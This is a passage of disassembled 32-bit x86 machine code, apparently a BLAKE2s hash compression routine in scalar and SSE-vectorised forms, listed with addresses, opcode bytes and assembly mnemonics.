  404168:	89 44 24 28          	mov    %eax,0x28(%esp)
  40416c:	8b 44 24 78          	mov    0x78(%esp),%eax
  404170:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404174:	8b 44 24 74          	mov    0x74(%esp),%eax
  404178:	89 44 24 38          	mov    %eax,0x38(%esp)
  40417c:	8b 44 24 70          	mov    0x70(%esp),%eax
  404180:	c7 44 24 18 67 e6 09 	movl   $0x6a09e667,0x18(%esp)
  404187:	6a 
  404188:	c7 44 24 24 85 ae 67 	movl   $0xbb67ae85,0x24(%esp)
  40418f:	bb 
  404190:	c7 44 24 2c 72 f3 6e 	movl   $0x3c6ef372,0x2c(%esp)
  404197:	3c 
  404198:	c7 44 24 34 3a f5 4f 	movl   $0xa54ff53a,0x34(%esp)
  40419f:	a5 
  4041a0:	89 74 24 14          	mov    %esi,0x14(%esp)
  4041a4:	89 44 24 30          	mov    %eax,0x30(%esp)
  4041a8:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4041ac:	0f b6 86 c0 36 43 00 	movzbl 0x4336c0(%esi),%eax
  4041b3:	8b bc 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%edi
  4041ba:	03 f9                	add    %ecx,%edi
  4041bc:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  4041c0:	03 7c 24 5c          	add    0x5c(%esp),%edi
  4041c4:	8b d7                	mov    %edi,%edx
  4041c6:	33 d3                	xor    %ebx,%edx
  4041c8:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  4041cc:	c1 c2 10             	rol    $0x10,%edx
  4041cf:	03 ca                	add    %edx,%ecx
  4041d1:	8b f1                	mov    %ecx,%esi
  4041d3:	33 74 24 10          	xor    0x10(%esp),%esi
  4041d7:	0f b6 83 c1 36 43 00 	movzbl 0x4336c1(%ebx),%eax
  4041de:	c1 ce 0c             	ror    $0xc,%esi
  4041e1:	8b 84 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%eax
  4041e8:	03 c6                	add    %esi,%eax
  4041ea:	03 c7                	add    %edi,%eax
  4041ec:	89 44 24 18          	mov    %eax,0x18(%esp)
  4041f0:	33 c2                	xor    %edx,%eax
  4041f2:	c1 c8 08             	ror    $0x8,%eax
  4041f5:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4041f9:	03 c1                	add    %ecx,%eax
  4041fb:	89 44 24 48          	mov    %eax,0x48(%esp)
  4041ff:	33 c6                	xor    %esi,%eax
  404201:	c1 c8 07             	ror    $0x7,%eax
  404204:	89 44 24 50          	mov    %eax,0x50(%esp)
  404208:	0f b6 83 c2 36 43 00 	movzbl 0x4336c2(%ebx),%eax
  40420f:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  404213:	8b bc 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%edi
  40421a:	03 7c 24 30          	add    0x30(%esp),%edi
  40421e:	03 7c 24 60          	add    0x60(%esp),%edi
  404222:	0f b6 83 c3 36 43 00 	movzbl 0x4336c3(%ebx),%eax
  404229:	8b d7                	mov    %edi,%edx
  40422b:	33 d5                	xor    %ebp,%edx
  40422d:	8b 6c 24 38          	mov    0x38(%esp),%ebp
  404231:	c1 c2 10             	rol    $0x10,%edx
  404234:	03 ca                	add    %edx,%ecx
  404236:	8b 84 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%eax
  40423d:	8b f1                	mov    %ecx,%esi
  40423f:	33 74 24 30          	xor    0x30(%esp),%esi
  404243:	c1 ce 0c             	ror    $0xc,%esi
  404246:	03 c6                	add    %esi,%eax
  404248:	03 c7                	add    %edi,%eax
  40424a:	89 44 24 10          	mov    %eax,0x10(%esp)
  40424e:	33 c2                	xor    %edx,%eax
  404250:	c1 c8 08             	ror    $0x8,%eax
  404253:	89 44 24 44          	mov    %eax,0x44(%esp)
  404257:	03 c1                	add    %ecx,%eax
  404259:	89 44 24 58          	mov    %eax,0x58(%esp)
  40425d:	33 c6                	xor    %esi,%eax
  40425f:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  404263:	c1 c8 07             	ror    $0x7,%eax
  404266:	89 44 24 24          	mov    %eax,0x24(%esp)
  40426a:	0f b6 83 c4 36 43 00 	movzbl 0x4336c4(%ebx),%eax
  404271:	8b b4 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%esi
  404278:	0f b6 83 c5 36 43 00 	movzbl 0x4336c5(%ebx),%eax
  40427f:	03 f5                	add    %ebp,%esi
  404281:	03 74 24 64          	add    0x64(%esp),%esi
  404285:	8b d6                	mov    %esi,%edx
  404287:	33 54 24 20          	xor    0x20(%esp),%edx
  40428b:	8b 84 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%eax
  404292:	c1 c2 10             	rol    $0x10,%edx
  404295:	03 ca                	add    %edx,%ecx
  404297:	33 e9                	xor    %ecx,%ebp
  404299:	c1 cd 0c             	ror    $0xc,%ebp
  40429c:	03 c5                	add    %ebp,%eax
  40429e:	03 c6                	add    %esi,%eax
  4042a0:	89 44 24 40          	mov    %eax,0x40(%esp)
  4042a4:	33 c2                	xor    %edx,%eax
  4042a6:	c1 c8 08             	ror    $0x8,%eax
  4042a9:	89 44 24 54          	mov    %eax,0x54(%esp)
  4042ad:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  4042b0:	8b c3                	mov    %ebx,%eax
  4042b2:	33 c5                	xor    %ebp,%eax
  4042b4:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4042b8:	c1 c8 07             	ror    $0x7,%eax
  4042bb:	89 44 24 20          	mov    %eax,0x20(%esp)
  4042bf:	0f b6 85 c6 36 43 00 	movzbl 0x4336c6(%ebp),%eax
  4042c6:	8b bc 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%edi
  4042cd:	03 7c 24 1c          	add    0x1c(%esp),%edi
  4042d1:	03 7c 24 68          	add    0x68(%esp),%edi
  4042d5:	0f b6 85 c7 36 43 00 	movzbl 0x4336c7(%ebp),%eax
  4042dc:	8b d7                	mov    %edi,%edx
  4042de:	33 54 24 28          	xor    0x28(%esp),%edx
  4042e2:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  4042e6:	c1 c2 10             	rol    $0x10,%edx
  4042e9:	8b 84 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%eax
  4042f0:	03 ca                	add    %edx,%ecx
  4042f2:	8b f1                	mov    %ecx,%esi
  4042f4:	33 74 24 1c          	xor    0x1c(%esp),%esi
  4042f8:	c1 ce 0c             	ror    $0xc,%esi
  4042fb:	03 c6                	add    %esi,%eax
  4042fd:	03 c7                	add    %edi,%eax
  4042ff:	8b f8                	mov    %eax,%edi
  404301:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  404305:	33 fa                	xor    %edx,%edi
  404307:	c1 cf 08             	ror    $0x8,%edi
  40430a:	8d 2c 0f             	lea    (%edi,%ecx,1),%ebp
  40430d:	8b c5                	mov    %ebp,%eax
  40430f:	33 c6                	xor    %esi,%eax
  404311:	c1 c8 07             	ror    $0x7,%eax
  404314:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404318:	8b 44 24 14          	mov    0x14(%esp),%eax
  40431c:	0f b6 80 c8 36 43 00 	movzbl 0x4336c8(%eax),%eax
  404323:	8b 8c 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%ecx
  40432a:	03 4c 24 24          	add    0x24(%esp),%ecx
  40432e:	03 4c 24 18          	add    0x18(%esp),%ecx
  404332:	8b d1                	mov    %ecx,%edx
  404334:	33 d7                	xor    %edi,%edx
  404336:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40433a:	c1 c2 10             	rol    $0x10,%edx
  40433d:	0f b6 87 c9 36 43 00 	movzbl 0x4336c9(%edi),%eax
  404344:	8d 34 1a             	lea    (%edx,%ebx,1),%esi
  404347:	8b de                	mov    %esi,%ebx
  404349:	33 5c 24 24          	xor    0x24(%esp),%ebx
  40434d:	8b 84 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%eax
  404354:	c1 cb 0c             	ror    $0xc,%ebx
  404357:	03 c3                	add    %ebx,%eax
  404359:	03 c1                	add    %ecx,%eax
  40435b:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  40435f:	33 c2                	xor    %edx,%eax
  404361:	c1 c8 08             	ror    $0x8,%eax
  404364:	89 44 24 28          	mov    %eax,0x28(%esp)
  404368:	89 84 24 98 00 00 00 	mov    %eax,0x98(%esp)
  40436f:	03 c6                	add    %esi,%eax
  404371:	33 d8                	xor    %eax,%ebx
  404373:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  404377:	89 84 24 84 00 00 00 	mov    %eax,0x84(%esp)
  40437e:	0f b6 87 ca 36 43 00 	movzbl 0x4336ca(%edi),%eax
  404385:	c1 cb 07             	ror    $0x7,%ebx
  404388:	89 5c 24 30          	mov    %ebx,0x30(%esp)
  40438c:	89 5c 24 70          	mov    %ebx,0x70(%esp)
  404390:	8b 8c 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%ecx
  404397:	03 4c 24 20          	add    0x20(%esp),%ecx
  40439b:	03 4c 24 10          	add    0x10(%esp),%ecx
  40439f:	0f b6 87 cb 36 43 00 	movzbl 0x4336cb(%edi),%eax
  4043a6:	8b d9                	mov    %ecx,%ebx
  4043a8:	33 5c 24 3c          	xor    0x3c(%esp),%ebx
  4043ac:	c1 c3 10             	rol    $0x10,%ebx
  4043af:	8b 84 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%eax
  4043b6:	8d 14 2b             	lea    (%ebx,%ebp,1),%edx
  4043b9:	8b ea                	mov    %edx,%ebp
  4043bb:	33 6c 24 20          	xor    0x20(%esp),%ebp
  4043bf:	c1 cd 0c             	ror    $0xc,%ebp
  4043c2:	03 c5                	add    %ebp,%eax
  4043c4:	03 c1                	add    %ecx,%eax
  4043c6:	33 d8                	xor    %eax,%ebx
  4043c8:	89 44 24 60          	mov    %eax,0x60(%esp)
  4043cc:	c1 cb 08             	ror    $0x8,%ebx
  4043cf:	8d 04 1a             	lea    (%edx,%ebx,1),%eax
  4043d2:	33 e8                	xor    %eax,%ebp
  4043d4:	89 44 24 34          	mov    %eax,0x34(%esp)
  4043d8:	89 84 24 88 00 00 00 	mov    %eax,0x88(%esp)
  4043df:	0f b6 87 cc 36 43 00 	movzbl 0x4336cc(%edi),%eax
  4043e6:	c1 cd 07             	ror    $0x7,%ebp
  4043e9:	89 6c 24 38          	mov    %ebp,0x38(%esp)
  4043ed:	89 6c 24 74          	mov    %ebp,0x74(%esp)
  4043f1:	8b 8c 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%ecx
  4043f8:	03 4c 24 1c          	add    0x1c(%esp),%ecx
  4043fc:	03 4c 24 40          	add    0x40(%esp),%ecx
  404400:	8b e9                	mov    %ecx,%ebp
  404402:	33 6c 24 44          	xor    0x44(%esp),%ebp
  404406:	0f b6 87 cd 36 43 00 	movzbl 0x4336cd(%edi),%eax
  40440d:	8b 54 24 48          	mov    0x48(%esp),%edx
  404411:	c1 c5 10             	rol    $0x10,%ebp
  404414:	03 d5                	add    %ebp,%edx
  404416:	8b 84 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%eax
  40441d:	8b f2                	mov    %edx,%esi
  40441f:	33 74 24 1c          	xor    0x1c(%esp),%esi
  404423:	c1 ce 0c             	ror    $0xc,%esi
  404426:	03 c6                	add    %esi,%eax
  404428:	03 c1                	add    %ecx,%eax
  40442a:	33 e8                	xor    %eax,%ebp
  40442c:	89 44 24 64          	mov    %eax,0x64(%esp)
  404430:	c1 cd 08             	ror    $0x8,%ebp
  404433:	8d 04 2a             	lea    (%edx,%ebp,1),%eax
  404436:	8b 54 24 58          	mov    0x58(%esp),%edx
  40443a:	33 f0                	xor    %eax,%esi
  40443c:	89 44 24 18          	mov    %eax,0x18(%esp)
  404440:	89 44 24 7c          	mov    %eax,0x7c(%esp)
  404444:	0f b6 87 ce 36 43 00 	movzbl 0x4336ce(%edi),%eax
  40444b:	c1 ce 07             	ror    $0x7,%esi
  40444e:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  404452:	89 74 24 78          	mov    %esi,0x78(%esp)
  404456:	8b 8c 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%ecx
  40445d:	03 4c 24 4c          	add    0x4c(%esp),%ecx
  404461:	03 4c 24 50          	add    0x50(%esp),%ecx
  404465:	8b 74 24 14          	mov    0x14(%esp),%esi
  404469:	8b f9                	mov    %ecx,%edi
  40446b:	33 7c 24 54          	xor    0x54(%esp),%edi
  40446f:	c1 c7 10             	rol    $0x10,%edi
  404472:	03 d7                	add    %edi,%edx
  404474:	8b c2                	mov    %edx,%eax
  404476:	33 44 24 50          	xor    0x50(%esp),%eax
  40447a:	c1 c8 0c             	ror    $0xc,%eax
  40447d:	89 44 24 10          	mov    %eax,0x10(%esp)
  404481:	0f b6 86 cf 36 43 00 	movzbl 0x4336cf(%esi),%eax
  404488:	83 c6 10             	add    $0x10,%esi
  40448b:	89 74 24 14          	mov    %esi,0x14(%esp)
  40448f:	8b 84 84 9c 00 00 00 	mov    0x9c(%esp,%eax,4),%eax
  404496:	03 44 24 10          	add    0x10(%esp),%eax
  40449a:	03 c1                	add    %ecx,%eax
  40449c:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4044a0:	33 f8                	xor    %eax,%edi
  4044a2:	89 44 24 68          	mov    %eax,0x68(%esp)
  4044a6:	c1 cf 08             	ror    $0x8,%edi
  4044a9:	89 7c 24 20          	mov    %edi,0x20(%esp)
  4044ad:	89 bc 24 94 00 00 00 	mov    %edi,0x94(%esp)
  4044b4:	8d 04 3a             	lea    (%edx,%edi,1),%eax
  4044b7:	33 c8                	xor    %eax,%ecx
  4044b9:	89 44 24 24          	mov    %eax,0x24(%esp)
  4044bd:	c1 c9 07             	ror    $0x7,%ecx
  4044c0:	89 84 24 80 00 00 00 	mov    %eax,0x80(%esp)
  4044c7:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4044cb:	89 4c 24 6c          	mov    %ecx,0x6c(%esp)
  4044cf:	81 fe 90 00 00 00    	cmp    $0x90,%esi
  4044d5:	0f 86 d1 fc ff ff    	jbe    0x4041ac
  4044db:	8b b4 24 e0 00 00 00 	mov    0xe0(%esp),%esi
  4044e2:	33 d2                	xor    %edx,%edx
  4044e4:	89 9c 24 8c 00 00 00 	mov    %ebx,0x8c(%esp)
  4044eb:	89 ac 24 90 00 00 00 	mov    %ebp,0x90(%esp)
  4044f2:	8b 8e f4 00 00 00    	mov    0xf4(%esi),%ecx
  4044f8:	8b 44 14 7c          	mov    0x7c(%esp,%edx,1),%eax
  4044fc:	33 44 14 5c          	xor    0x5c(%esp,%edx,1),%eax
  404500:	31 04 0a             	xor    %eax,(%edx,%ecx,1)
  404503:	83 c2 04             	add    $0x4,%edx
  404506:	83 fa 20             	cmp    $0x20,%edx
  404509:	72 e7                	jb     0x4044f2
  40450b:	5f                   	pop    %edi
  40450c:	5e                   	pop    %esi
  40450d:	5d                   	pop    %ebp
  40450e:	5b                   	pop    %ebx
  40450f:	81 c4 cc 00 00 00    	add    $0xcc,%esp
  404515:	c2 08 00             	ret    $0x8
  404518:	55                   	push   %ebp
  404519:	8b ec                	mov    %esp,%ebp
  40451b:	83 e4 f0             	and    $0xfffffff0,%esp
  40451e:	83 ec 68             	sub    $0x68,%esp
  404521:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404524:	8b 45 08             	mov    0x8(%ebp),%eax
  404527:	56                   	push   %esi
  404528:	57                   	push   %edi
  404529:	8b 51 10             	mov    0x10(%ecx),%edx
  40452c:	8b 80 f4 00 00 00    	mov    0xf4(%eax),%eax
  404532:	8b 71 08             	mov    0x8(%ecx),%esi
  404535:	8b 39                	mov    (%ecx),%edi
  404537:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  40453b:	0f 10 60 10          	movups 0x10(%eax),%xmm4
  40453f:	0f 10 18             	movups (%eax),%xmm3
  404542:	8b 41 18             	mov    0x18(%ecx),%eax
  404545:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  404549:	66 0f 6e c2          	movd   %edx,%xmm0
  40454d:	66 0f 6e ce          	movd   %esi,%xmm1
  404551:	66 0f 6e d0          	movd   %eax,%xmm2
  404555:	8b 45 08             	mov    0x8(%ebp),%eax
  404558:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  40455c:	66 0f 6e ff          	movd   %edi,%xmm7
  404560:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404564:	8b 80 f8 00 00 00    	mov    0xf8(%eax),%eax
  40456a:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  40456e:	66 0f fe fb          	paddd  %xmm3,%xmm7
  404572:	0f 29 5c 24 50       	movaps %xmm3,0x50(%esp)
  404577:	66 0f fe fc          	paddd  %xmm4,%xmm7
  40457b:	0f 29 64 24 60       	movaps %xmm4,0x60(%esp)
  404580:	0f 10 00             	movups (%eax),%xmm0
  404583:	66 0f ef 05 10 f0 43 	pxor   0x43f010,%xmm0
  40458a:	00 
  40458b:	8b 41 04             	mov    0x4(%ecx),%eax
  40458e:	66 0f ef c7          	pxor   %xmm7,%xmm0
  404592:	0f 28 d8             	movaps %xmm0,%xmm3
  404595:	89 74 24 24          	mov    %esi,0x24(%esp)
  404599:	8b 71 14             	mov    0x14(%ecx),%esi
  40459c:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  4045a1:	66 0f 72 d3 10       	psrld  $0x10,%xmm3
  4045a6:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  4045aa:	8b 79 0c             	mov    0xc(%ecx),%edi
  4045ad:	66 0f ef d8          	pxor   %xmm0,%xmm3
  4045b1:	0f 28 f3             	movaps %xmm3,%xmm6
  4045b4:	89 54 24 20          	mov    %edx,0x20(%esp)
  4045b8:	66 0f fe 35 00 f0 43 	paddd  0x43f000,%xmm6
  4045bf:	00 
  4045c0:	8b 51 1c             	mov    0x1c(%ecx),%edx
  4045c3:	0f 28 c6             	movaps %xmm6,%xmm0
  4045c6:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4045ca:	66 0f 6e cf          	movd   %edi,%xmm1
  4045ce:	0f 28 e0             	movaps %xmm0,%xmm4
  4045d1:	66 0f 6e e8          	movd   %eax,%xmm5
  4045d5:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  4045da:	66 0f 72 f4 14       	pslld  $0x14,%xmm4
  4045df:	66 0f 6e d2          	movd   %edx,%xmm2
  4045e3:	66 0f ef e0          	pxor   %xmm0,%xmm4
  4045e7:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  4045eb:	66 0f 6e c6          	movd   %esi,%xmm0
  4045ef:	66 0f 62 e8          	punpckldq %xmm0,%xmm5
  4045f3:	66 0f 62 e9          	punpckldq %xmm1,%xmm5
  4045f7:	66 0f fe ef          	paddd  %xmm7,%xmm5
  4045fb:	89 74 24 18          	mov    %esi,0x18(%esp)
  4045ff:	8b 71 30             	mov    0x30(%ecx),%esi
  404602:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404606:	0f 28 c5             	movaps %xmm5,%xmm0
  404609:	0f 29 6c 24 40       	movaps %xmm5,0x40(%esp)
  40460e:	66 0f ef c3          	pxor   %xmm3,%xmm0
  404612:	89 7c 24 28          	mov    %edi,0x28(%esp)
  404616:	8b 79 38             	mov    0x38(%ecx),%edi
  404619:	0f 28 e8             	movaps %xmm0,%xmm5
  40461c:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  404621:	66 0f 72 f5 18       	pslld  $0x18,%xmm5
  404626:	89 54 24 14          	mov    %edx,0x14(%esp)
  40462a:	66 0f ef e8          	pxor   %xmm0,%xmm5
  40462e:	89 44 24 10          	mov    %eax,0x10(%esp)
  404632:	0f 28 fd             	movaps %xmm5,%xmm7
  404635:	89 7c 24 34          	mov    %edi,0x34(%esp)
  404639:	66 0f fe fe          	paddd  %xmm6,%xmm7
  40463d:	89 74 24 30          	mov    %esi,0x30(%esp)
  404641:	0f 28 cf             	movaps %xmm7,%xmm1
  404644:	66 0f ef cc          	pxor   %xmm4,%xmm1
  404648:	0f 28 c1             	movaps %xmm1,%xmm0
  40464b:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  404650:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  404655:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404659:	66 0f 70 d8 39       	pshufd $0x39,%xmm0,%xmm3
  40465e:	8b 51 28             	mov    0x28(%ecx),%edx
  404661:	8b 41 20             	mov    0x20(%ecx),%eax
  404664:	66 0f 6e d7          	movd   %edi,%xmm2
  404668:	8b 79 3c             	mov    0x3c(%ecx),%edi
  40466b:	66 0f 6e c6          	movd   %esi,%xmm0
  40466f:	8b 71 34             	mov    0x34(%ecx),%esi
  404672:	66 0f 6e ca          	movd   %edx,%xmm1
  404676:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  40467a:	66 0f 6e e0          	movd   %eax,%xmm4
  40467e:	66 0f 62 e0          	punpckldq %xmm0,%xmm4
  404682:	66 0f 62 e1          	punpckldq %xmm1,%xmm4
  404686:	66 0f fe 64 24 40    	paddd  0x40(%esp),%xmm4
  40468c:	66 0f fe e3          	paddd  %xmm3,%xmm4
  404690:	66 0f 70 c5 93       	pshufd $0x93,%xmm5,%xmm0
  404695:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404699:	66 0f 70 f7 4e       	pshufd $0x4e,%xmm7,%xmm6
  40469e:	0f 11 64 24 40       	movups %xmm4,0x40(%esp)
  4046a3:	89 7c 24 38          	mov    %edi,0x38(%esp)
  4046a7:	8b 79 2c             	mov    0x2c(%ecx),%edi
  4046aa:	0f 28 e0             	movaps %xmm0,%xmm4
  4046ad:	8b 49 24             	mov    0x24(%ecx),%ecx
  4046b0:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  4046b5:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  4046ba:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  4046be:	8b 7c 24 38          	mov    0x38(%esp),%edi
  4046c2:	66 0f ef e0          	pxor   %xmm0,%xmm4
  4046c6:	66 0f 6e 4c 24 0c    	movd   0xc(%esp),%xmm1
  4046cc:	66 0f fe f4          	paddd  %xmm4,%xmm6
  4046d0:	0f 28 c6             	movaps %xmm6,%xmm0
  4046d3:	66 0f 6e f9          	movd   %ecx,%xmm7
  4046d7:	66 0f ef c3          	pxor   %xmm3,%xmm0
  4046db:	0f 28 d8             	movaps %xmm0,%xmm3
  4046de:	66 0f 6e d7          	movd   %edi,%xmm2
  4046e2:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  4046e7:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  4046ec:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  4046f0:	66 0f ef d8          	pxor   %xmm0,%xmm3
  4046f4:	66 0f 6e d6          	movd   %esi,%xmm2
  4046f8:	66 0f 6e c6          	movd   %esi,%xmm0
  4046fc:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404700:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  404704:	66 0f fe 7c 24 40    	paddd  0x40(%esp),%xmm7
  40470a:	66 0f fe fb          	paddd  %xmm3,%xmm7
  40470e:	0f 28 c7             	movaps %xmm7,%xmm0
  404711:	66 0f ef c4          	pxor   %xmm4,%xmm0
  404715:	0f 28 e0             	movaps %xmm0,%xmm4
  404718:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
  40471d:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  404722:	66 0f ef e0          	pxor   %xmm0,%xmm4
  404726:	0f 28 ec             	movaps %xmm4,%xmm5
  404729:	66 0f fe ee          	paddd  %xmm6,%xmm5
  40472d:	66 0f 6e 74 24 34    	movd   0x34(%esp),%xmm6
  404733:	0f 28 cd             	movaps %xmm5,%xmm1
  404736:	66 0f ef cb          	pxor   %xmm3,%xmm1
  40473a:	0f 28 c1             	movaps %xmm1,%xmm0
  40473d:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  404742:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  404747:	66 0f ef c1          	pxor   %xmm1,%xmm0
  40474b:	66 0f 6e 4c 24 20    	movd   0x20(%esp),%xmm1
  404751:	66 0f 70 d8 93       	pshufd $0x93,%xmm0,%xmm3
  404756:	66 0f 6e c1          	movd   %ecx,%xmm0
  40475a:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  40475e:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404762:	66 0f 6e 54 24 1c    	movd   0x1c(%esp),%xmm2
  404768:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  40476c:	66 0f fe f7          	paddd  %xmm7,%xmm6
  404770:	66 0f 70 c4 39       	pshufd $0x39,%xmm4,%xmm0
  404775:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404779:	66 0f ef c6          	pxor   %xmm6,%xmm0
  40477d:	0f 28 f8             	movaps %xmm0,%xmm7
  404780:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404785:	66 0f 72 d7 10       	psrld  $0x10,%xmm7
  40478a:	66 0f ef f8          	pxor   %xmm0,%xmm7
  40478e:	66 0f 70 c5 4e       	pshufd $0x4e,%xmm5,%xmm0
  404793:	66 0f fe c7          	paddd  %xmm7,%xmm0
  404797:	0f 11 44 24 40       	movups %xmm0,0x40(%esp)
  40479c:	66 0f ef c3          	pxor   %xmm3,%xmm0
  4047a0:	0f 28 d8             	movaps %xmm0,%xmm3
  4047a3:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  4047a8:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  4047ad:	66 0f ef d8          	pxor   %xmm0,%xmm3
  4047b1:	66 0f 6e c7          	movd   %edi,%xmm0
  4047b5:	66 0f 6e c8          	movd   %eax,%xmm1
  4047b9:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  4047bd:	66 0f 6e ea          	movd   %edx,%xmm5
  4047c1:	66 0f 62 e8          	punpckldq %xmm0,%xmm5
  4047c5:	66 0f 62 e9          	punpckldq %xmm1,%xmm5
  4047c9:	66 0f fe ee          	paddd  %xmm6,%xmm5
  4047cd:	66 0f 6e 54 24 18    	movd   0x18(%esp),%xmm2
  4047d3:	66 0f fe eb          	paddd  %xmm3,%xmm5
  4047d7:	66 0f 6e 74 24 10    	movd   0x10(%esp),%xmm6
  4047dd:	66 0f ef fd          	pxor   %xmm5,%xmm7
  4047e1:	0f 28 e7             	movaps %xmm7,%xmm4
  4047e4:	66 0f 72 d7 08       	psrld  $0x8,%xmm7
  4047e9:	66 0f 72 f4 18       	pslld  $0x18,%xmm4
  4047ee:	66 0f ef e7          	pxor   %xmm7,%xmm4
  4047f2:	0f 10 7c 24 40       	movups 0x40(%esp),%xmm7
  4047f7:	66 0f fe fc          	paddd  %xmm4,%xmm7
  4047fb:	0f 28 cf             	movaps %xmm7,%xmm1
  4047fe:	66 0f ef cb          	pxor   %xmm3,%xmm1
  404802:	0f 28 c1             	movaps %xmm1,%xmm0
  404805:	66 0f 72 d1 07       	psrld  $0x7,%xmm1
  40480a:	66 0f 72 f0 19       	pslld  $0x19,%xmm0
  40480f:	66 0f ef c1          	pxor   %xmm1,%xmm0
  404813:	66 0f 6e 4c 24 2c    	movd   0x2c(%esp),%xmm1
  404819:	66 0f 70 d8 39       	pshufd $0x39,%xmm0,%xmm3
  40481e:	66 0f 6e 44 24 0c    	movd   0xc(%esp),%xmm0
  404824:	66 0f 62 f0          	punpckldq %xmm0,%xmm6
  404828:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  40482c:	66 0f 62 f1          	punpckldq %xmm1,%xmm6
  404830:	66 0f 6e 54 24 28    	movd   0x28(%esp),%xmm2
  404836:	66 0f fe f5          	paddd  %xmm5,%xmm6
  40483a:	66 0f 6e 4c 24 24    	movd   0x24(%esp),%xmm1
  404840:	66 0f fe f3          	paddd  %xmm3,%xmm6
  404844:	66 0f 70 c4 93       	pshufd $0x93,%xmm4,%xmm0
  404849:	66 0f ef c6          	pxor   %xmm6,%xmm0
  40484d:	66 0f 70 ef 4e       	pshufd $0x4e,%xmm7,%xmm5
  404852:	0f 28 e0             	movaps %xmm0,%xmm4
  404855:	66 0f 6e 7c 24 30    	movd   0x30(%esp),%xmm7
  40485b:	66 0f 72 f0 10       	pslld  $0x10,%xmm0
  404860:	66 0f 72 d4 10       	psrld  $0x10,%xmm4
  404865:	66 0f 62 ca          	punpckldq %xmm2,%xmm1
  404869:	66 0f ef e0          	pxor   %xmm0,%xmm4
  40486d:	66 0f 6e d7          	movd   %edi,%xmm2
  404871:	66 0f fe ec          	paddd  %xmm4,%xmm5
  404875:	0f 28 c5             	movaps %xmm5,%xmm0
  404878:	66 0f ef c3          	pxor   %xmm3,%xmm0
  40487c:	0f 28 d8             	movaps %xmm0,%xmm3
  40487f:	66 0f 72 d0 0c       	psrld  $0xc,%xmm0
  404884:	66 0f 72 f3 14       	pslld  $0x14,%xmm3
  404889:	66 0f ef d8          	pxor   %xmm0,%xmm3
  40488d:	66 0f 6e 44 24 14    	movd   0x14(%esp),%xmm0
  404893:	66 0f 62 f8          	punpckldq %xmm0,%xmm7
  404897:	66 0f 62 f9          	punpckldq %xmm1,%xmm7
  40489b:	66 0f fe fe          	paddd  %xmm6,%xmm7
  40489f:	66 0f fe fb          	paddd  %xmm3,%xmm7
  4048a3:	0f 28 c7             	movaps %xmm7,%xmm0
  4048a6:	66 0f ef c4          	pxor   %xmm4,%xmm0
  4048aa:	0f 28 e0             	movaps %xmm0,%xmm4
  4048ad:	66 0f 72 d0 08       	psrld  $0x8,%xmm0
